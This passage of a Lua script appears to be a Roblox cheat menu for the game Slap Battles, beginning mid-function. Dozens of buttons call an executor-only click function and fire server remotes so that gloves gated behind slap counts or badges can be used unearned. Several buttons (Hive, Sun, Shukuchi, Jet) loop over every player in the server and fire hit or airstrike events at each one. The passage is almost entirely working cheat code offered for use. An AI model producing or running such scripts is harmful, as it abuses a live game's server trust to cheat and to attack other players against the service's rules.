fireclickdetector(workspace.Lobby["Golden"].ClickDetector)
wait(0.1)
local args = {
    [1] = true
}

game:GetService("ReplicatedStorage"):WaitForChild("Goldify"):FireServer(unpack(args))
end
})

Section = Tab:AddSection({
	Name = "MR (3000 Slaps)"
})

Tab:AddButton({
	Name = "MR",
	Callback = function()   
fireclickdetector(workspace.Lobby["MR"].ClickDetector)
wait(0.1)
game:GetService("ReplicatedStorage"):WaitForChild("Spherify"):FireServer()
end
})

Section = Tab:AddSection({
	Name = "Hive (3250 Slaps)"
})

Tab:AddButton({
	Name = "Hive",
	Callback = function()   
fireclickdetector(workspace.Lobby["Hive"].ClickDetector)
wait(0.1)
game:GetService("ReplicatedStorage").GeneralAbility:FireServer()
wait(0.1)
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local GeneralHit = ReplicatedStorage:WaitForChild("GeneralHit")

for _, player in pairs(Players:GetPlayers()) do
    if player.Character and player.Character:FindFirstChild("Left Arm") then
        local args = {
            player.Character["Left Arm"]
        }

        GeneralHit:FireServer(unpack(args))
    end
end

end
})

Section = Tab:AddSection({
	Name = "Baby (3750 Slaps)"
})

Tab:AddButton({
	Name = "Baby",
	Callback = function()   
fireclickdetector(workspace.Lobby["Baby"].ClickDetector)
wait(0.1)
game:GetService("ReplicatedStorage").GeneralAbility:FireServer()
end
})

Section = Tab:AddSection({
	Name = "Replica (4000 Slaps)"
})

Tab:AddButton({
	Name = "Replica",
	Callback = function()   
fireclickdetector(workspace.Lobby["Replica"].ClickDetector)
wait(0.1)
game:GetService("ReplicatedStorage"):WaitForChild("Duplicate"):FireServer()
end
})

Section = Tab:AddSection({
	Name = "Defense (4500 Slaps)"
})

Tab:AddButton({
	Name = "Defense",
	Callback = function()   
fireclickdetector(workspace.Lobby["Defense"].ClickDetector)
wait(0.1)
game:GetService("ReplicatedStorage"):WaitForChild("Barrier"):FireServer()
end
})

Section = Tab:AddSection({
	Name = "Pineslapple (5250 Slaps)"
})

Tab:AddButton({
	Name = "Pineslapple",
	Callback = function()   
fireclickdetector(workspace.Lobby["Pineslapple"].ClickDetector)
wait(0.1)
game:GetService("ReplicatedStorage").GeneralAbility:FireServer()
end
})
 
Section = Tab:AddSection({
	Name = "Shukuchi (6000 Slaps)"
})

Tab:AddButton({
	Name = "Shukuchi",
	Callback = function()   
fireclickdetector(workspace.Lobby["Shukuchi"].ClickDetector)
wait(0.1)
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local SM = ReplicatedStorage:WaitForChild("SM")

for _, player in pairs(Players:GetPlayers()) do
    local args = { player }

    SM:FireServer(unpack(args))
end
end
})

Section = Tab:AddSection({
	Name = "Duelist (6500 Slaps)"
})

Tab:AddButton({
	Name = "Duelist",
	Callback = function()   
fireclickdetector(workspace.Lobby["Duelist"].ClickDetector)
wait(0.1)
game:GetService("ReplicatedStorage").DuelistAbility:FireServer()
end
})

Section = Tab:AddSection({
	Name = "Woah (7000 Slaps)"
})

Tab:AddButton({
	Name = "Woah",
	Callback = function()   
fireclickdetector(workspace.Lobby["Woah"].ClickDetector)
wait(0.1)
game:GetService("ReplicatedStorage").VineThud:FireServer()
end
})

Section = Tab:AddSection({
	Name = "Adios (8000 Slaps)"
})

Tab:AddButton({
	Name = "Adios",
	Callback = function()   
fireclickdetector(workspace.Lobby["Adios"].ClickDetector)
wait(0.1)
game:GetService("ReplicatedStorage").AdiosActivated:FireServer()
end
})

Section = Tab:AddSection({
	Name = "Engineer (9000 Slaps)"
})

Tab:AddButton({
	Name = "Engineer",
	Callback = function()   
fireclickdetector(workspace.Lobby["Engineer"].ClickDetector)
wait(0.1)
game:GetService("ReplicatedStorage").Sentry:FireServer()
end
})

Section = Tab:AddSection({
	Name = "Rocky (9500 Slaps)"
})

Tab:AddButton({
	Name = "Rocky",
	Callback = function()   
fireclickdetector(workspace.Lobby["Rocky"].ClickDetector)
wait(0.1)
game:GetService("ReplicatedStorage").RockyShoot:FireServer()
end
})

Section = Tab:AddSection({
	Name = "Coil (9750 Slaps)"
})

Tab:AddButton({
	Name = "Coil",
	Callback = function()   
fireclickdetector(workspace.Lobby["Coil"].ClickDetector)
wait(0.1)
local args = {
    [1] = game:GetService("Players").LocalPlayer.Character.Coil
}

game:GetService("ReplicatedStorage").GeneralAbility:FireServer(unpack(args))
end
})

Section = Tab:AddSection({
	Name = "Balloony (10500 Slaps)"
})

Tab:AddButton({
	Name = "Balloony",
	Callback = function()   
fireclickdetector(workspace.Lobby["Balloony"].ClickDetector)
wait(0.1)
local args = {
    [1] = game:GetService("Players").LocalPlayer.Character.Balloony
}

game:GetService("ReplicatedStorage").GeneralAbility:FireServer(unpack(args))
end
})

Section = Tab:AddSection({
	Name = "Phantom (11000 Slaps)"
})

Tab:AddButton({
	Name = "Phantom",
	Callback = function()  
fireclickdetector(workspace.Lobby["Phantom"].ClickDetector) 
wait(0.1)
local args = {
    [1] = game:GetService("Players").LocalPlayer.Character.Phantom
}

game:GetService("ReplicatedStorage").PhantomDash:InvokeServer(unpack(args))

end
})

Section = Tab:AddSection({
	Name = "Leafblower (11500 Slaps)"
})

Tab:AddButton({
	Name = "Leafblower",
	Callback = function()   
fireclickdetector(workspace.Lobby["Leafblower"].ClickDetector)
wait(0.1)
game:GetService("ReplicatedStorage").GeneralAbility:FireServer()
end
})

Section = Tab:AddSection({
	Name = "El Gato (11500 Slaps)"
})

Tab:AddButton({
	Name = "El Gato",
	Callback = function()   
fireclickdetector(workspace.Lobby["el gato"].ClickDetector)
wait(0.1)
game:GetService("ReplicatedStorage").GeneralAbility:FireServer()
end
})

Section = Tab:AddSection({
	Name = "Shackle (12500 Slaps)"
})

Tab:AddButton({
	Name = "Shackle",
	Callback = function()   
fireclickdetector(workspace.Lobby["Shackle"].ClickDetector)
wait(0.1)
game:GetService("ReplicatedStorage").GeneralAbility:FireServer()
end
})

Section = Tab:AddSection({
	Name = "STOP (13000 Slaps)"
})

Tab:AddButton({
	Name = "STOP",
	Callback = function()   
fireclickdetector(workspace.Lobby["STOP"].ClickDetector)
wait(0.1)
local args = {
    [1] = true
}

game:GetService("ReplicatedStorage").STOP:FireServer(unpack(args))
end
})

Section = Tab:AddSection({
	Name = "Track (14000 Slaps)"
})

Tab:AddButton({
	Name = "Track",
	Callback = function()   
fireclickdetector(workspace.Lobby["Track"].ClickDetector)
wait(0.1)
local args = {
    [1] = game:GetService("Players").LocalPlayer.Character
}

game:GetService("ReplicatedStorage").GeneralAbility:FireServer(unpack(args))
end
})

Section = Tab:AddSection({
	Name = "Cherry (15500 Slaps)"
})

Tab:AddButton({
	Name = "Cherry",
	Callback = function()   
fireclickdetector(workspace.Lobby["Track"].ClickDetector)
wait(0.1)
game:GetService("ReplicatedStorage").Events.Cherry:FireServer()
end
})

Section = Tab:AddSection({
	Name = "Shield (16000 Slaps)"
})

Tab:AddButton({
	Name = "Shield",
	Callback = function()   
fireclickdetector(workspace.Lobby["Shield"].ClickDetector)
wait(0.1)
game:GetService("ReplicatedStorage").GeneralAbility:FireServer()
end
})

Section = Tab:AddSection({
	Name = "Ping Pong (18000 Slaps)"
})

Tab:AddButton({
	Name = "Ping Pong",
	Callback = function()   
fireclickdetector(workspace.Lobby["Ping Pong"].ClickDetector)
wait(0.1)
game:GetService("ReplicatedStorage").GeneralAbility:FireServer()
end
})

Section = Tab:AddSection({
	Name = "Trifecta (18500 Slaps)"
})

Tab:AddButton({
	Name = "Trifecta",
	Callback = function()   
fireclickdetector(workspace.Lobby["Trifecta"].ClickDetector)
wait(0.1)
game:GetService("ReplicatedStorage").GeneralAbility:FireServer()
end
})

Section = Tab:AddSection({
	Name = "Baller (19000 Slaps)"
})

Tab:AddButton({
	Name = "Baller",
	Callback = function()   
fireclickdetector(workspace.Lobby["Baller"].ClickDetector)
wait(0.1)
game:GetService("ReplicatedStorage").GeneralAbility:FireServer()
end
})

Section = Tab:AddSection({
	Name = "Architect (19500 Slaps)"
})

Tab:AddButton({
	Name = "Architect",
	Callback = function()   
fireclickdetector(workspace.Lobby["Architect"].ClickDetector)
wait(0.1)
game:GetService("ReplicatedStorage").GeneralAbility:FireServer()
end
})

Section = Tab:AddSection({
	Name = "Home Run (20000 Slaps)"
})

Tab:AddButton({
	Name = "Home Run",
	Callback = function()   
fireclickdetector(workspace.Lobby["Home Run"].ClickDetector)
wait(0.1)
local args = {
    [1] = {
        ["start"] = true
    }
}

game:GetService("ReplicatedStorage").HomeRun:FireServer(unpack(args))
end
})

Section = Tab:AddSection({
	Name = "Friction (20500 Slaps)"
})

Tab:AddButton({
	Name = "Friction",
	Callback = function()   
fireclickdetector(workspace.Lobby["Friction"].ClickDetector)
wait(0.1)
game:GetService("ReplicatedStorage").Events.Friction:FireServer()
end
})

Section = Tab:AddSection({
	Name = "Whirlwind (21000 Slaps)"
})

Tab:AddButton({
	Name = "Whirlwind",
	Callback = function()   
fireclickdetector(workspace.Lobby["Whirlwind"].ClickDetector)
wait(0.1)
game:GetService("ReplicatedStorage").GeneralAbility:FireServer()
end
})

Section = Tab:AddSection({
	Name = "Disc (21500 Slaps)"
})

Tab:AddButton({
	Name = "Disc",
	Callback = function()   
fireclickdetector(workspace.Lobby["Disc"].ClickDetector)
wait(0.1)
game:GetService("ReplicatedStorage").Events.Disc:FireServer()
end
})

Section = Tab:AddSection({
	Name = "Slicer (22000 Slaps)"
})

Tab:AddButton({
	Name = "Slicer",
	Callback = function()   
fireclickdetector(workspace.Lobby["Slicer"].ClickDetector)
wait(0.1)
local args = {
    [1] = "slash",
    [2] = CFrame.new(0, 0, 0) * CFrame.Angles(0, 0, 0),
    [3] = Vector3.new(0, 0, 0)
}

game:GetService("ReplicatedStorage").Slicer:FireServer(unpack(args))
end
})

Section = Tab:AddSection({
	Name = "Grenadier (22500 Slaps)"
})

Tab:AddButton({
	Name = "Grenadier",
	Callback = function()   
fireclickdetector(workspace.Lobby["Grenadier"].ClickDetector)
wait(0.1)
game:GetService("ReplicatedStorage").GeneralAbility:FireServer()
end
})

Section = Tab:AddSection({
	Name = "Excavator (23000 Slaps)"
})

Tab:AddButton({
	Name = "Excavator",
	Callback = function()   
fireclickdetector(workspace.Lobby["Excavator"].ClickDetector)
wait(0.1)
game:GetService("ReplicatedStorage").Excavator:InvokeServer()
end
})

Section = Tab:AddSection({
	Name = "Retribution (23500 Slaps)"
})

Tab:AddButton({
	Name = "Retribution",
	Callback = function()   
fireclickdetector(workspace.Lobby["Retribution"].ClickDetector)
wait(0.1)
game:GetService("ReplicatedStorage").RetributionRelease:FireServer()
end
})

Section = Tab:AddSection({
	Name = "Pylon (24500 Slaps)"
})

Tab:AddButton({
	Name = "Pylon",
	Callback = function()   
fireclickdetector(workspace.Lobby["Pylon"].ClickDetector)
wait(0.1)
game:GetService("ReplicatedStorage").PylonAbility:FireServer()
end
})

Section = Tab:AddSection({
	Name = "Thor (25000 Slaps)"
})

Tab:AddButton({
	Name = "Thor",
	Callback = function()   
fireclickdetector(workspace.Lobby["Thor"].ClickDetector)
wait(0.1)
local args = {
    [1] = "AddI"
}

game:GetService("ReplicatedStorage").ThorAbility:FireServer(unpack(args))
end
})

Section = Tab:AddSection({
	Name = "Slime (25500 Slaps)"
})

Tab:AddButton({
	Name = "Slime",
	Callback = function()   
fireclickdetector(workspace.Lobby["Slime"].ClickDetector)
wait(0.1)
game:GetService("ReplicatedStorage").GeneralAbility:FireServer()
end
})

Section = Tab:AddSection({
	Name = "Pocket (26000 Slaps)"
})

Tab:AddButton({
	Name = "Pocket",
	Callback = function()   
fireclickdetector(workspace.Lobby["Pocket"].ClickDetector)
wait(0.1)
local args = {
    [1] = CFrame.new(0, 0, 0) * CFrame.Angles(0, 0, 0)
}

game:GetService("ReplicatedStorage").GeneralAbility:FireServer(unpack(args))
end
})

Section = Tab:AddSection({
	Name = "Cloud (28000 Slaps)"
})

Tab:AddButton({
	Name = "Cloud",
	Callback = function()   
fireclickdetector(workspace.Lobby["Cloud"].ClickDetector)
wait(0.1)
game:GetService("ReplicatedStorage").CloudAbility:FireServer()
end
})

Section = Tab:AddSection({
	Name = "Gravity (29000 Slaps)"
})

Tab:AddButton({
	Name = "Gravity",
	Callback = function()   
fireclickdetector(workspace.Lobby["Gravity"].ClickDetector)
wait(0.1)
game:GetService("ReplicatedStorage").GeneralAbility:FireServer()
end
})

Section = Tab:AddSection({
	Name = "Parry (30000 Slaps)"
})

Tab:AddButton({
	Name = "Parry",
	Callback = function()   
fireclickdetector(workspace.Lobby["Parry"].ClickDetector)
wait(0.1)
game:GetService("ReplicatedStorage").GeneralAbility:FireServer()
end
})

Section = Tab:AddSection({
	Name = "Meteor (32000 Slaps)"
})

Tab:AddButton({
	Name = "Meteor",
	Callback = function()   
fireclickdetector(workspace.Lobby["Meteor"].ClickDetector)
wait(0.1)
local args = {
    [1] = 24.187499964609742,
    [2] = 1.2202083320356905
}

game:GetService("ReplicatedStorage").GeneralAbility:FireServer(unpack(args))
end
})

Section = Tab:AddSection({
	Name = "Oven (33000 Slaps)"
})

Tab:AddButton({
	Name = "Oven",
	Callback = function()   
fireclickdetector(workspace.Lobby["Oven"].ClickDetector)
wait(0.1)
local args = {
    [1] = CFrame.new(0, 0, 0) *
CFrame.Angles(0, 0, 0)
}

game:GetService("ReplicatedStorage").GeneralAbility:FireServer(unpack(args))
end
})

Section = Tab:AddSection({
	Name = "Sun (35000 Slaps)"
})

Tab:AddButton({
	Name = "Sun (Slap)",
	Callback = function()   
fireclickdetector(workspace.Lobby["Sun"].ClickDetector)
wait(0.1)
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local GeneralHit = ReplicatedStorage:WaitForChild("GeneralHit")

for _, player in pairs(Players:GetPlayers()) do
    if player.Character and player.Character:FindFirstChild("Left Arm") then
        local args = {
            player.Character["Left Arm"]
        }

        GeneralHit:FireServer(unpack(args))
    end
end
end
})

Tab:AddButton({
	Name = "Sun (Ability)",
	Callback = function()   
fireclickdetector(workspace.Lobby["Sun"].ClickDetector)
wait(0.1)
local args = {
    [1] = "Cast"
}

game:GetService("ReplicatedStorage").GeneralAbility:FireServer(unpack(args))
end
})

Section = Tab:AddSection({
	Name = "Ferryman (36000 Slaps)"
})

Tab:AddButton({
	Name = "Ferryman (strike)",
	Callback = function()   
fireclickdetector(workspace.Lobby["Ferryman"].ClickDetector)
wait(0.1)
local args = {
    [1] = "Strike"
}

game:GetService("Players").LocalPlayer.Character.FerrymanStaff.StaffConfig.AbilityEvent:FireServer(unpack(args))
end
})

Tab:AddButton({
	Name = "Ferryman (leap)",
	Callback = function()   
fireclickdetector(workspace.Lobby["Ferryman"].ClickDetector)
wait(0.1)
local args = {
    [1] = "Leap"
}

game:GetService("Players").LocalPlayer.Character.FerrymanStaff.StaffConfig.AbilityEvent:FireServer(unpack(args))
end
})

Section = Tab:AddSection({
	Name = "Blackhole (37000 Slaps)"
})

Tab:AddButton({
	Name = "Blackhole",
	Callback = function()   
fireclickdetector(workspace.Lobby["Blackhole"].ClickDetector)
wait(0.1)
game:GetService("ReplicatedStorage").GeneralAbility:FireServer()
end
})

Section = Tab:AddSection({
	Name = "Walrus (37500 Slaps)"
})

Tab:AddButton({
	Name = "Walrus",
	Callback = function()   
fireclickdetector(workspace.Lobby["Walrus"].ClickDetector)
wait(0.1)
game:GetService("ReplicatedStorage").Events.WalrusGeneric:FireServer()
end
})

Section = Tab:AddSection({
	Name = "Blink (38000 Slaps)"
})

Tab:AddButton({
	Name = "Blink (on)",
	Callback = function()   
fireclickdetector(workspace.Lobby["Blink"].ClickDetector)
wait(0.1)
local args = {
    [1] = "OutOfBody",
    [2] = {
        ["mousebehavior"] = Enum.MouseBehavior.Default,
        ["ismoving"] = false,
        ["dir"] = Vector3.new(0, 0, 0)
    }
}

game:GetService("ReplicatedStorage").Blink:FireServer(unpack(args))
end
})

Tab:AddButton({
	Name = "Blink (off)",
	Callback = function()   
fireclickdetector(workspace.Lobby["Blink"].ClickDetector)
wait(0.1)
local args = {
    [1] = "IntoBody"
}

game:GetService("ReplicatedStorage").Blink:FireServer(unpack(args))
end
})

Section = Tab:AddSection({
	Name = "Tableflip (39000 Slaps)"
})

Tab:AddButton({
	Name = "Tableflip",
	Callback = function()   
fireclickdetector(workspace.Lobby["Tableflip"].ClickDetector)
wait(0.1)
game:GetService("ReplicatedStorage").GeneralAbility:FireServer()
end
})

Section = Tab:AddSection({
	Name = "Beatdown (41000 Slaps)"
})

Tab:AddButton({
	Name = "Beatdown",
	Callback = function()   
fireclickdetector(workspace.Lobby["Beatdown"].ClickDetector)
wait(0.1)
game:GetService("ReplicatedStorage").GeneralAbility:FireServer()
end
})

Section = Tab:AddSection({
	Name = "Chicken (42000 Slaps)"
})

Tab:AddButton({
	Name = "Chicken",
	Callback = function()   
fireclickdetector(workspace.Lobby["Chicken"].ClickDetector)
wait(0.1)
game:GetService("ReplicatedStorage").GeneralAbility:FireServer()
end
})

Section = Tab:AddSection({
	Name = "BONK (43000 Slaps)"
})

Tab:AddButton({
	Name = "BONK",
	Callback = function()   
fireclickdetector(workspace.Lobby["BONK"].ClickDetector)
wait(0.1)
game:GetService("ReplicatedStorage").GeneralAbility:FireServer()
end
})

Section = Tab:AddSection({
	Name = "Sbeve (44000 Slaps)"
})

Tab:AddButton({
	Name = "Sbeve",
	Callback = function()   
fireclickdetector(workspace.Lobby["Sbeve"].ClickDetector)
wait(0.1)
game:GetService("ReplicatedStorage").GeneralAbility:FireServer()
end
})

Section = Tab:AddSection({
	Name = "Golem (45000 Slaps)"
})

Tab:AddButton({
	Name = "Golem",
	Callback = function()   
fireclickdetector(workspace.Lobby["Golem"].ClickDetector)
wait(0.1)
game:GetService("ReplicatedStorage").GeneralAbility:FireServer()
end
})

Section = Tab:AddSection({
	Name = "UFO (47000 Slaps)"
})

Tab:AddButton({
	Name = "UFO",
	Callback = function()   
fireclickdetector(workspace.Lobby["UFO"].ClickDetector)
wait(0.1)
game:GetService("ReplicatedStorage").GeneralAbility:FireServer()
end
})

Section = Tab:AddSection({
	Name = "Demolition (48000 Slaps)"
})

Tab:AddButton({
	Name = "Demolition (spawn)",
	Callback = function()   
fireclickdetector(workspace.Lobby["Demolition"].ClickDetector)
wait(0.1)
local args = {
    [1] = "c4"
}

game:GetService("ReplicatedStorage").GeneralAbility:FireServer(unpack(args))
end
})

Tab:AddButton({
	Name = "Demolition (blow)",
	Callback = function()   
fireclickdetector(workspace.Lobby["Demolition"].ClickDetector)
wait(0.1)
game:GetService("ReplicatedStorage").Events.c4:FireServer()
end
})

Section = Tab:AddSection({
	Name = "Beachball (49000 Slaps)"
})

Tab:AddButton({
	Name = "Beachball",
	Callback = function()   
fireclickdetector(workspace.Lobby["Beachball"].ClickDetector)
wait(0.1)
game:GetService("ReplicatedStorage").GeneralAbility:FireServer()
end
})

Section = Tab:AddSection({
	Name = "Shotgun (50000 Slaps)"
})

Tab:AddButton({
	Name = "Shotgun",
	Callback = function()   
fireclickdetector(workspace.Lobby["Shotgun"].ClickDetector)
wait(0.1)
local args = {
    [1] = "buckshot"
}

game:GetService("ReplicatedStorage").GeneralAbility:FireServer(unpack(args))
end
})

Section = Tab:AddSection({
	Name = "64 (51000 Slaps)"
})

Tab:AddButton({
	Name = "64",
	Callback = function()   
fireclickdetector(workspace.Lobby["64"].ClickDetector)
wait(0.1)
local args = {
    [1] = CFrame.new(0, 0, 0) * CFrame.Angles(0, 0, 0)
}

game:GetService("ReplicatedStorage").GeneralAbility:FireServer(unpack(args))
end
})

Section = Tab:AddSection({
	Name = "Barrel (53000 Slaps)"
})

Tab:AddButton({
	Name = "Barrel",
	Callback = function()   
fireclickdetector(workspace.Lobby["Barrel"].ClickDetector)
wait(0.1)
local args = {
    [1] = {
        ["cf"] = CFrame.new(0, 0, 0) * CFrame.Angles(0, 0, 0)
    }
}

game:GetService("ReplicatedStorage").GeneralAbility:FireServer(unpack(args))
end
})

Section = Tab:AddSection({
	Name = "Lawnmower (54000 Slaps)"
})

Tab:AddButton({
	Name = "Lawnmower (spawn)",
	Callback = function()   
fireclickdetector(workspace.Lobby["Lawnmower"].ClickDetector)
wait(0.1)
local args = {
    [1] = "lawnmower"
}

game:GetService("ReplicatedStorage").GeneralAbility:FireServer(unpack(args))
end
})

Tab:AddButton({
	Name = "Lawnmower (stop)",
	Callback = function()   
fireclickdetector(workspace.Lobby["Lawnmower"].ClickDetector)
wait(0.1)
local args = {
    [1] = "remove"
}

game:GetService("ReplicatedStorage").GeneralAbility:FireServer(unpack(args))
end
})

Section = Tab:AddSection({
	Name = "Virus (55000 Slaps)"
})

Tab:AddButton({
	Name = "Virus",
	Callback = function()   
fireclickdetector(workspace.Lobby["Virus"].ClickDetector)
wait(0.1)
game:GetService("ReplicatedStorage").GeneralAbility:FireServer()
end
})

Section = Tab:AddSection({
	Name = "Smiler (55500 Slaps)"
})

Tab:AddButton({
	Name = "Smiler",
	Callback = function()   
fireclickdetector(workspace.Lobby["Smiler"].ClickDetector)
wait(0.1)
game:GetService("ReplicatedStorage").Events.Smiler:FireServer()
end
})

Section = Tab:AddSection({
	Name = "Butcher (55750 Slaps)"
})

Tab:AddButton({
	Name = "Butcher E Ability",
	Callback = function()   
fireclickdetector(workspace.Lobby["Butcher"].ClickDetector)
wait(0.1)
game:GetService("ReplicatedStorage").Events.butcherEvent:FireServer()
end
})

Tab:AddButton({
	Name = "Butcher R Ability",
	Callback = function()   
fireclickdetector(workspace.Lobby["Butcher"].ClickDetector)
wait(0.1)
game:GetService("ReplicatedStorage").Events.butcherR:FireServer()
end
})

Section = Tab:AddSection({
	Name = "Infinity (56000 Slaps)"
})

Tab:AddButton({
	Name = "Infinity",
	Callback = function()   
fireclickdetector(workspace.Lobby["Infinity"].ClickDetector)
wait(0.1)
game:GetService("ReplicatedStorage").GeneralAbility:FireServer()
end
})

Section = Tab:AddSection({
	Name = "Aggro (57000 Slaps)"
})

Tab:AddButton({
	Name = "Aggro",
	Callback = function()   
fireclickdetector(workspace.Lobby["Aggro"].ClickDetector)
wait(0.1)
game:GetService("ReplicatedStorage").Events.aggro:FireServer()
end
})

Section = Tab:AddSection({
	Name = "Medusa (58000 Slaps)"
})

Tab:AddButton({
	Name = "Medusa",
	Callback = function()   
fireclickdetector(workspace.Lobby["Medusa"].ClickDetector)
wait(0.1)
game:GetService("ReplicatedStorage").GeneralAbility:FireServer()
end
})

Section = Tab:AddSection({
	Name = "Seal (59000 Slaps)"
})

Tab:AddButton({
	Name = "Seal",
	Callback = function()   
fireclickdetector(workspace.Lobby["Seal"].ClickDetector)
wait(0.1)
game:GetService("ReplicatedStorage").Events.Seal:FireServer()
end
})

Section = Tab:AddSection({
	Name = "Soul (60000 Slaps)"
})

Tab:AddButton({
	Name = "Soul",
	Callback = function()   
fireclickdetector(workspace.Lobby["Soul"].ClickDetector)
wait(0.1)
game:GetService("ReplicatedStorage").Events.soul:FireServer()
end
})

Section = Tab:AddSection({
	Name = "R/C (61000 Slaps)"
})

Tab:AddButton({
	Name = "R/C",
	Callback = function()   
fireclickdetector(workspace.Lobby["R/C"].ClickDetector)
wait(0.1)
game:GetService("ReplicatedStorage").GeneralAbility:FireServer()
end
})

Section = Tab:AddSection({
	Name = "Mushroom (62000 Slaps)"
})

Tab:AddButton({
	Name = "Mushroom",
	Callback = function()   
fireclickdetector(workspace.Lobby["Mushroom"].ClickDetector)
wait(0.1)
game:GetService("ReplicatedStorage").Events.mushroom:FireServer()
end
})

Section = Tab:AddSection({
	Name = "Scuba (63000 Slaps)"
})

Tab:AddButton({
	Name = "Scuba",
	Callback = function()   
fireclickdetector(workspace.Lobby["Scuba"].ClickDetector)
wait(0.1)
game:GetService("ReplicatedStorage").Events.ScubaEvent:FireServer()
end
})

Section = Tab:AddSection({
	Name = "Pyromania (64000 Slaps)"
})

Tab:AddButton({
	Name = "Pyromania",
	Callback = function()   
fireclickdetector(workspace.Lobby["Pyromania"].ClickDetector)
wait(0.1)
game:GetService("ReplicatedStorage").PyromaniaRefuelCooldown:FireServer()
end
})

Section = Tab:AddSection({
	Name = "Automaton (64500 Slaps)"
})

Tab:AddButton({
	Name = "Automaton",
	Callback = function()   
fireclickdetector(workspace.Lobby["Automaton"].ClickDetector)
wait(0.1)
game:GetService("ReplicatedStorage").Events.automaton_event:FireServer()
end
})

Section = Tab:AddSection({
	Name = "God's Hand (65000 Slaps)"
})

Tab:AddButton({
	Name = "God's Hand",
	Callback = function()   
fireclickdetector(workspace.Lobby["God's Hand"].ClickDetector)
wait(0.1)
game:GetService("ReplicatedStorage").TimestopJump:FireServer()
game:GetService("ReplicatedStorage").Timestopchoir:FireServer()
game:GetService("ReplicatedStorage").Timestop:FireServer()
end
})

Section = Tab:AddSection({
	Name = "Megarock (WHY badge)"
})

Tab:AddButton({
	Name = "Megarock",
	Callback = function() 
fireclickdetector(workspace.Lobby["Megarock"].ClickDetector)
wait(0.1)
game:GetService("ReplicatedStorage").Rockmode:FireServer()
end
})

Section = Tab:AddSection({
	Name = "Hallow Jack (Jack's will badge)"
})

Tab:AddButton({
	Name = "Hallow Jack",
	Callback = function()   
fireclickdetector(workspace.Lobby["Hallow Jack"].ClickDetector)
wait(0.1)
game:GetService("ReplicatedStorage").Hallow:FireServer()
end
})

Section = Tab:AddSection({
	Name = "[REDACTED] (Evaded badge)"
})

Tab:AddButton({
	Name = "[REDACTED]",
	Callback = function()   
fireclickdetector(workspace.Lobby["[REDACTED]"].ClickDetector)
wait(0.1)
game:GetService("ReplicatedStorage").Well:FireServer()
end
})

Section = Tab:AddSection({
	Name = "bus (To the moon badge)"
})

Tab:AddButton({
	Name = "bus",
	Callback = function()   
fireclickdetector(workspace.Lobby["bus"].ClickDetector)
wait(0.1)
game:GetService("ReplicatedStorage").busmoment:FireServer()
end
})

Section = Tab:AddSection({
	Name = "Mitten (Lucky Gift badge)"
})

Tab:AddButton({
	Name = "Mitten",
	Callback = function()   
fireclickdetector(workspace.Lobby["Mitten"].ClickDetector)
wait(0.1)
game:GetService("ReplicatedStorage").MittenA:FireServer()
end
})

Section = Tab:AddSection({
	Name = "Phase (Unphased badge)"
})

Tab:AddButton({
	Name = "Phase",
	Callback = function()   
fireclickdetector(workspace.Lobby["Phase"].ClickDetector)
wait(0.1)
game:GetService("ReplicatedStorage").PhaseA:FireServer()
end
})

Section = Tab:AddSection({
	Name = "Warp (Savior badge)"
})

Tab:AddButton({
	Name = "Warp",
	Callback = function()  
fireclickdetector(workspace.Lobby["Warp"].ClickDetector)
wait(0.1)
game:GetService("ReplicatedStorage").WLOC:FireServer()
end
})

Section = Tab:AddSection({
	Name = "Bomb (Short fuse badge)"
})

Tab:AddButton({
	Name = "Bomb",
	Callback = function()   
fireclickdetector(workspace.Lobby["Bomb"].ClickDetector)
wait(0.1)
game:GetService("ReplicatedStorage").BombThrow:FireServer()
end
})

Section = Tab:AddSection({
	Name = "Bubble (250 badge)"
})

Tab:AddButton({
	Name = "Bubble",
	Callback = function()  
fireclickdetector(workspace.Lobby["Bubble"].ClickDetector)
wait(0.1)
game:GetService("ReplicatedStorage").BubbleThrow:FireServer()
end
})

Section = Tab:AddSection({
	Name = "Jet (Orb of flight badge)"
})

Tab:AddButton({
	Name = "Jet",
	Callback = function()   
fireclickdetector(workspace.Lobby["Jet"].ClickDetector)
wait(0.1)
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local AirStrike = ReplicatedStorage:WaitForChild("AirStrike")

for _, player in pairs(Players:GetPlayers()) do
    if player.Character then
        local args = { player.Character }

        AirStrike:FireServer(unpack(args))
    end
end

end
})

Section = Tab:AddSection({
	Name = "Shard (Firefighter badge)"
})

Tab:AddButton({
	Name = "Shard",
	Callback = function()   
fireclickdetector(workspace.Lobby["Shard"].ClickDetector)
wait(0.1)
game:GetService("ReplicatedStorage").Shards:FireServer()
end
})

Section = Tab:AddSection({
	Name = "bob (bob badge)"
})

Tab:AddButton({
	Name = "bob",
	Callback = function()   
fireclickdetector(workspace.Lobby["bob"].ClickDetector)
wait(0.1)
game:GetService("ReplicatedStorage").bob:FireServer()
end
})

Section = Tab:AddSection({
	Name = "Rage (Anticlimactic End badge)"
})

Tab:AddButton({
	Name = "Rage",
	Callback = function()   
fireclickdetector(workspace.Lobby["Rage"].ClickDetector)
wait(0.1)
game:GetService("ReplicatedStorage").GRRRRR:FireServer()
end
})

Section = Tab:AddSection({
	Name = "Trap (Brick Master badge)"
})

Tab:AddButton({
	Name = "Trap",
	Callback = function()   
fireclickdetector(workspace.Lobby["Trap"].ClickDetector)
wait(0.1)
game:GetService("ReplicatedStorage").funnyhilariousbeartrap:FireServer()
end
})

Section = Tab:AddSection({
	Name = "Rattlebones (Candy King badge)"
})

Tab:AddButton({
	Name = "Rattlebones",
	Callback = function()   
fireclickdetector(workspace.Lobby["Rattlebones"].ClickDetector)
wait(0.1)
game:GetService("ReplicatedStorage").GeneralAbility:FireServer()
end
})

Section = Tab:AddSection({
	Name = "Tycoon (Plate Master badge)"
})

Tab:AddButton({
	Name = "Tycoon",
	Callback = function()   
fireclickdetector(workspace.Lobby["Tycoon"].ClickDetector)
wait(0.1)
local args = {
    [1] = CFrame.new(0, 0, 0) * CFrame.Angles(0, 0, 0)
}

game:GetService("ReplicatedStorage").GeneralAbility:FireServer(unpack(args))
end
})

Section = Tab:AddSection({
	Name = "Glitch (01010010 01010101 01001110 badge)"
})

Tab:AddButton({
	Name = "Glitch",
	Callback = function()   
fireclickdetector(workspace.Lobby["Glitch"].ClickDetector)
wait(0.1)
game:GetService("ReplicatedStorage").GeneralAbility:FireServer()
end
})

Section = Tab:AddSection({
	Name = "Snowball (Engineer's Gift badge)"
})

